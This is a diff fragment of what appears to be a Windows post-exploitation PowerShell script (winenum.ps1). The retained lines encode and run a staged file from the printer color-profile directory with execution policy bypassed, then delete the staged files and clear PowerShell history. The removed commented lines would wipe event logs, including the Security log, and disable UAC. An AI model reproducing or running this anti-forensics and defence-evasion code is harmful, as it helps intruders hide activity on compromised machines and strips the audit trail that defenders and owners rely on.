@@ -119,13 +119,6 @@ Write-Output "################################## Finished ######################
 certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 0.txt
 Unblock-File -Path "C:\Windows\System32\spool\drivers\color\0.txt"
 powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\0.txt"
-# Send output file
-
-# Remove bash history
-# Remove-Item C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-# Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-# Clear-EventLog -LogName Windows PowerShell, System, Application, OAlerts, Security -ComputerName $env:computername -ErrorAction SilentlyContinue
-# clear-all-event-logs -ComputerName $env:computername
 attrib -h 1.txt
 attrib -h 2.txt
 Remove-Item 1.txt -Force
@@ -134,6 +127,3 @@ attrib -h winenum.ps1
 Clear-History
 Clear-Host
 Remove-Item winenum.ps1 -Force 
-#Disables UAC, need restart
-#New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
-#Restart-Computer -Force
